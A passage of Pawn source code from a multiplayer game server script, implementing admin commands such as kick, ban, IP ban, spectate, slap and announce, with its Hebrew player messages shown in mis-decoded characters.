		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if((equal(cmd,"/xunj") || equal(cmd,"/xunjail")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /xunjail(xunj) [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
 		if(!playerinfo[id][xjail])
		{
			format(string,sizeof(string)," .ìà áëìà úîéãé %s",GetName(id));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		playerinfo[id][xjail] = 0;
		SetPlayerInterior(id,0);
		SetFreeze(id,0);
		SpawnPlayer(id);
		if(playerinfo[id][logged]) fsetint(fuser(id),"XJail1",0);
		format(string,sizeof(string)," *** %s has been xunjailed by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/spec") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 2");
		new id, string[M_S], mode;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /spec [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		cmd = strtok(cmdtext,idx), mode = !strlen(cmd) || !IsNumeric(cmd) ? SPECTATE_MODE_NORMAL : strval(cmd);
		SavePlayerPos(playerid);
 		TogglePlayerSpectating(playerid,1);
 		if(IsPlayerInAnyVehicle(id)) PlayerSpectateVehicle(playerid,GetPlayerVehicleID(id),mode);
 		else PlayerSpectatePlayer(playerid,id,mode);
 		SetPlayerInterior(playerid,GetPlayerInterior(id));
 		SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(id));
 		playerinfo[playerid][spectate] = id;
		format(string,sizeof(string)," .%s ëòú àúä áîò÷á òì",GetName(id));
		SendClientMessage(playerid,yellow,string);
		return 1;
	}
	if(equal(cmd,"/specoff") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 2");
 		TogglePlayerSpectating(playerid,0);
 		playerinfo[playerid][spectate] = -1;
		SendClientMessage(playerid,yellow," .äôñ÷ú àú äîò÷á");
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		return 1;
	}
	if(equal(cmd,"/respawn") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 2");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /respawn [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(IsPlayerInAnyVehicle(id))
		{
			RemovePlayerFromVehicle(id);
			SetVehicleToRespawn(GetPlayerVehicleID(id));
		}
		SpawnPlayer(id);
		format(string,sizeof(string)," *** %s has been respawned by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/getlevel") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 2");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getlevel [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		format(string,sizeof(string)," äéà: %d %s øîú äàãîéï ùì",playerinfo[id][admin],GetName(id));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/eject") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 2");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /eject [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(!IsPlayerInAnyVehicle(id))
		{
			format(string,sizeof(string)," .ìà ðîöà áøëá %s",GetName(id));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		RemovePlayerFromVehicle(id);
		format(string,sizeof(string)," *** %s has been ejected by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/slap") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 2");
		new id, Float:h, Float:p[3], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /slap [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		GetPlayerArmour(id,h);
		if(h > 0.0) SetPlayerArmour2(id,h-2.0);
		else
		{
			SetPlayerArmour2(id,0.0);
			GetPlayerHealth(id,h);
			SetPlayerHealth2(id,h-5.0);
		}
		if(IsPlayerInAnyVehicle(id)) SetVehicleVelocity(GetPlayerVehicleID(id),0.0,0.0,0.2);
		else
		{
			GetPlayerPos(id,p[0],p[1],p[2]);
			SetPlayerPos(id,p[0],p[1],p[2]+3.0);
		}
		PlayerPlaySound(playerid,1190,0.0,0.0,0.0);
		PlayerPlaySound(id,1190,0.0,0.0,0.0);
		format(string,sizeof(string)," *** %s has been slapped by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/getbank") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 2");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getbank [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		format(string,sizeof(string)," äåà: %d$ %s îñôø äëñó ááð÷ ùéù ì",playerinfo[id][bank],GetName(id));
		SendClientMessage(playerid,yellow,string);
		return 1;
	}
	if(equal(cmd,"/kick") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 2");
		new id, reason[256];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /kick [id/name] [reason] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = " .äàãîéï ìà ä÷ìéã ñéáä";
		SetKick(id,playerid,reason);
		return 1;
	}
	if((equal(cmd,"/cd") || equal(cmd,"/countdown")) && IsPlayerMAdmin(playerid))
	{
		new secs, f;
		if(playerinfo[playerid][admin] < 2 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 2");
		if(cd[0]) return SendClientMessage(playerid,red," .ëáø éù ñôéøä ëòú");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /countdown(cd) [seconds] [freeze? 0/1] :öåøú äùéîåù");
		secs = strval(cmd);
		if(secs < 1 || secs > 600) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ñôéøä ùì éåúø î600 ùðéåú àå ôçåú îùðéä");
		cmd = strtok(cmdtext,idx);
		f = !strlen(cmd) || !IsNumeric(cmd)? 0:strval(cmd);
		if(f < 0 || f > 1) return SendClientMessage(playerid,red," .àôùøåú ä÷ôàä áñôéøä ùâåéä");
		if(f) for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i)) SetFreeze(i,1);
		cd[0] = 1, cd[1] = secs, cd[2] = SetTimerEx("CountDown",1000,1,"d",f);
		return 1;
	}
	if((equal(cmd,"/scd") || equal(cmd,"/scountdown")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 2");
		if(!cd[0]) return SendClientMessage(playerid,red," .àéï ñôéøä ëòú");
		cd[0] = 0, cd[1] = 0;
		KillTimer(cd[2]);
		return 1;
	}
	if((equal(cmd,"/dm") || equal(cmd,"/disarmmoney")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /disarmmoney(dm) [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		ResetMoney(id);
		format(string,sizeof(string)," *** %s has been money disarmed by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][showpunish] || IsPlayerMAdmin(i) || i == playerid)) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/jetpack") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 2");
		if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK) return SendClientMessage(playerid,red," .àúä ëáø îùúîù áúé÷ ñéìåï");
		if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú îçåõ ìøëá");
		if(IsPlayerInCircle(playerid,-67.1489,-3230.8315,50.0)) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîé÷åîê äðåëçé");
		if(!playerinfo[playerid][pinv]) return SendClientMessage(playerid,red," .òìéê ìäéåú àãîéï ìáï áëãé ìäùúîù áô÷åãä æå");
		GiveJetpack(playerid);
		return 1;
	}
	if(equal(cmd,"/dontseedc") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 12");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /dontseedc [on/off] :öåøú äùéîåù");
		if(equal(cmd,"on"))
		{
			if(dontseedc) return SendClientMessage(playerid,red," .äàåôöéä \'àé øàééú äåãòåú ëðéñä åéöéàä\' ëáø ôåòìú");
			dontseedc = 1;
			format(string,sizeof(string)," .%s äàåôöéä \'àé øàééú äåãòåú ëðéñä åéöéàä\' äåôòìä òì éãé äàãîéï",GetName(playerid));
			SendClientMessageToAll(orange,string);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"off"))
		{
			if(!dontseedc) return SendClientMessage(playerid,red," .äàåôöéä \'àé øàééú äåãòåú ëðéñä åéöéàä\' ìà ôåòìú");
			dontseedc = 0;
			format(string,sizeof(string)," .%s äàåôöéä \'àé øàééú äåãòåú ëðéñä åéöéàä\' äåôñ÷ä òì éãé äàãîéï",GetName(playerid));
			SendClientMessageToAll(orange,string);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/ban") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 3");
		new id, reason[256], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /ban [id/name] [reason] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = " .äàãîéï ìà ä÷ìéã ñéáä";
		for(new i = 0; i < sizeof(BanReasons); i++) if(equal(reason,BanReasons[i][0])) format(reason,sizeof(reason),BanReasons[i][1]);
		format(string,sizeof(string),"(%d)%s %s banned (%d)%s %s [reason: %s]",playerid,GetIP(playerid),GetName(playerid),id,GetIP(id),GetName(id),reason);
		Log("Bans",playerid,string);
		print(string);
		SetBan(id,playerid,reason);
		return 1;
	}
	if(equal(cmd,"/unban") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 3");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /unban [name] :öåøú äùéîåù");
		if(!fexist(fuserban(cmd))) return SendClientMessage(playerid,red," .äùç÷ï äðáçø ìà ááàï");
		format(string,sizeof(string),"/DM/Bans/IP/%s.ini",fgetstring(fuserban(cmd),"PlayerIP"));
		if(fexist(string)) fremove(string);
		fremove(fuserban(cmd));
		format(string,sizeof(string)," *** %s has been unbanned by %s.",cmd,GetName(playerid));
		SendClientMessageToAll(red,string);
		format(string,sizeof(string),"(%d)%s %s unbanned \"%s\"",playerid,GetIP(playerid),GetName(playerid),cmd);
		Log("Bans",playerid,string);
		return 1;
	}
	if(equal(cmd,"/nban") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 3");
		new id, reason[256], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /nban [id/name] [reason] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(fkeyexist(file_nbans,GetName(id))) return SendClientMessage(playerid,red," .äëéðåé äæä ëáø ááàï");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = " .äàãîéï ìà ä÷ìéã ñéáä";
		format(string,sizeof(string)," *** %s has been name banned by %s. (%s)",GetName(id),GetName(playerid),reason);
		SendClientMessageToAll(red,string);
		fileCheck(file_nbans);
		format(string,sizeof(string),"%s|%s",GetName(playerid),reason);
		fsetstring(file_nbans,GetName(id),string);
		Kick(id);
		return 1;
	}
	if(equal(cmd,"/unnban") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 3");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /unnban [name] :öåøú äùéîåù");
		if(!fkeyexist(file_nbans,cmd)) return SendClientMessage(playerid,red," .äëéðåé äæä ìà ááàï");
		format(string,sizeof(string)," *** %s has been name unbanned by %s.",cmd,GetName(playerid));
		SendClientMessageToAll(red,string);
		fileCheck(file_nbans);
		fremovekey(file_nbans,cmd);
		return 1;
	}
	if((equal(cmd,"/ann") || equal(cmd,"/announce")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 3");
		new string[M_S];
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /announce(ann) [text] :öåøú äùéîåù");
		format(string,sizeof(string),"~p~%s~h~:~n~~w~%s",GetName(playerid),cmd);
		GameTextForAll(string,5000,5);
		return 1;
	}
	if((equal(cmd,"/ann2") || equal(cmd,"/announce2")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 3");
		new string[M_S], text[256], st = 0;
		cmd = strtok(cmdtext,idx), text = strrest(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd) || !strlen(text)) return SendClientMessage(playerid,white," /announce2(ann2) [style] [text] :öåøú äùéîåù");
		st = strval(cmd);
		if(st < 0 || st > 6 || st == 2) return SendClientMessage(playerid,red," .àééãé ñèééì ùâåé");
		format(string,sizeof(string),"~w~%s",GetName(playerid),cmd);
		GameTextForAll(string,5000,st);
		return 1;
	}
	if(equal(cmd,"/akill") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 3");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /akill [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		SetPlayerHealth2(id,0.0);
		format(string,sizeof(string)," *** %s has been killed by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/baninfo") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 3");
		cmd = strtok(cmdtext,idx);
		new string[M_S];
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /baninfo [name] :öåøú äùéîåù");
		if(!fexist(fuserban(cmd))) return SendClientMessage(playerid,red," .äùç÷ï äðáçø ìà ááàï");
		format(string,sizeof(string)," ~~~ :%s - ôøèé áàï ~~~",cmd);
		SendClientMessage(playerid,lightblue,string);
		SendClientMessage(playerid,grey," :äñéáä ìáàï äéà");
		SendClientMessage(playerid,grey,fgetstring(fuserban(cmd),"Reason"));
		if(fkeyexist(fuserban(cmd),"AdminName"))
		{
			format(string,sizeof(string)," %s :äàãîéï ùðúï àú äáàï",fgetstring(fuserban(cmd),"AdminName"));
			SendClientMessage(playerid,grey,string);
		}
		if(fkeyexist(fuserban(cmd),"Year") && fkeyexist(fuserban(cmd),"Month") && fkeyexist(fuserban(cmd),"Day"))
		{
			format(string,sizeof(string)," úàøéê: %d.%d.%d",fgetint(fuserban(cmd),"Day"),fgetint(fuserban(cmd),"Month"),fgetint(fuserban(cmd),"Year"));
			SendClientMessage(playerid,grey,string);
		}
		if(fkeyexist(fuserban(cmd),"Hour") && fkeyexist(fuserban(cmd),"Minute"))
		{
			format(string,sizeof(string)," ùòä: %d:%d",fgetint(fuserban(cmd),"Hour"),fgetint(fuserban(cmd),"Minute"));
			SendClientMessage(playerid,grey,string);
		}
		if(fkeyexist(fuserban(cmd),"S"))
		{
			format(string,sizeof(string)," îöá äáàï: %s",equal(fgetstring(fuserban(cmd),"S"),"Yes") ? ("îåñúø") : ("øâéì"));
			SendClientMessage(playerid,grey,string);
		}
		return 1;
	}
	if(equal(cmd,"/banip") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 3");
		new string[M_S], id;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /banip [id/name/ip] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp]))
		{
		    id = -1;
			for(new i=0,l=strlen(cmd);i<l;i++) if((cmd[i] < '0' || cmd[i] > '9') && cmd[i] != '.') return SendClientMessage(playerid,red," .ëúåáú äàééôé ùä÷ìãú îëéìä úåéí ìà çå÷ééí ìàééôé");
			if(strlen(cmd) < 7 || strlen(cmd) > 15) return SendClientMessage(playerid,red," .àééôé ÷öø àå àøåê îãé");
		}
		if(id == -1)
		{
			format(string,sizeof(string)," .äàééôé ùä÷ìãú (%s) ÷éáì áàï",cmd);
			SendClientMessage(playerid,red,string);
			format(string,sizeof(string),"banip %s",cmd);
		}
		else
		{
			if(!CommandAllowed(playerid,id,cmdtext)) return 1;
			format(string,sizeof(string)," .÷éáì áàï àééôé %s",GetName(id));
			SendClientMessage(playerid,red,string);
			format(string,sizeof(string),"banip %s",GetIP(id));
		}
		SendRconCommand(string);
		return 1;
	}
	if(equal(cmd,"/unbanip") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 3");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /unbanip [ip] :öåøú äùéîåù");
		for(new i=0,l=strlen(cmd);i<l;i++) if((cmd[i] < '0' || cmd[i] > '9') && cmd[i] != '.') return SendClientMessage(playerid,red," .ëúåáú äàééôé ùä÷ìãú îëéìä úåéí ìà çå÷ééí ìàééôé");
		if(strlen(cmd) < 7 || strlen(cmd) > 15) return SendClientMessage(playerid,red," .àééôé ÷öø àå àøåê îãé");
		format(string,sizeof(string)," .ìàééôé ùä÷ìãú (%s) ééøã äáàï",cmd);
		SendClientMessage(playerid,red,string);
		format(string,sizeof(string),"unbanip %s",cmd);
		SendRconCommand(string);
		return 1;
	}
	if((equal(cmd,"/explode") || equal(cmd,"/xp")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï ");
		new id, string[M_S], Float:p[3];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /explode(xp) [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		GetPlayerPos(id,p[0],p[1],p[2]);
		CreateExplosion(p[0],p[1],p[2],7,50);
		format(string,sizeof(string)," *** %s has been exploded by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i)) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/userban") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï ");
		new string[M_S], id = INVALID_PLAYER_ID;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /userban [name] :öåøú äùéîåù");
		format(string,sizeof(string),"/DM/Users/%s.ini",cmd);
		if(!fexist(string)) return SendClientMessage(playerid,red," .ùí îùúîù ìà ÷ééí");
		fsetint(string,"Ban",1);
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(equal(GetName(i),cmd))
			{
				id = i;
				if(!CommandAllowed(playerid,id,cmdtext)) return 1;
				playerinfo[i][banned] = 1;
				break;
			}
		}
		format(string,sizeof(string)," *** User %s has been locked by %s.",cmd,GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		if(IsPlayerConnected(id)) Kick(id);
		return 1;
	}
	if(equal(cmd,"/unuserban") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï ");
		new string[M_S], id = INVALID_PLAYER_ID;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /unuserban [name] :öåøú äùéîåù");
		format(string,sizeof(string),"/DM/Users/%s.ini",cmd);
		if(!fexist(string)) return SendClientMessage(playerid,red," .ùí îùúîù ìà ÷ééí");
		fsetint(string,"Ban",0);
		format(string,sizeof(string)," *** User %s has been unlocked by %s.",cmd,GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/b") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 3");
		new string[M_S];
		if(!IsPlayerConnected(lastAdv)) return SendClientMessage(playerid,red," .äîôøñí äàçøåï äúðú÷");
		if(!CommandAllowed(playerid,lastAdv,cmdtext)) return 1;
		format(string,sizeof(string),"(%d)%s %s quickly banned (%d)%s %s for server adv",playerid,GetIP(playerid),GetName(playerid),lastAdv,GetIP(lastAdv),GetName(lastAdv));
		Log("Bans",playerid,string);
		print(string);
		SetBan(lastAdv,playerid," îôøñí ùøúéí");
		return 1;
	}
	if(equal(cmd,"/setcolor") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 4 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 4");
		new id, r, g, b, inv, c, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /setcolor [id/name] [red 0-255] [green 0-255] [blue 0-255] [inv 0-255] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		r = strval(strtok(cmdtext,idx)),
		cmd = strtok(cmdtext,idx),
		g = !strlen(cmd) || !IsNumeric(cmd)? r:strval(cmd),
		cmd = strtok(cmdtext,idx),
		b = !strlen(cmd) || !IsNumeric(cmd)? g:strval(cmd),
		cmd = strtok(cmdtext,idx),
		inv = !strlen(cmd) || !IsNumeric(cmd)? 255:strval(cmd);
		if(r < 0 || r > 255 || g < 0 || g > 255 || b < 0 || b > 255 || inv < 0 || inv > 255) return SendClientMessage(playerid,red," .àçã îäöáòéí ùâåé");
		c = rgba2hex(r,g,b,inv);
		SetPlayerColor(id,c);
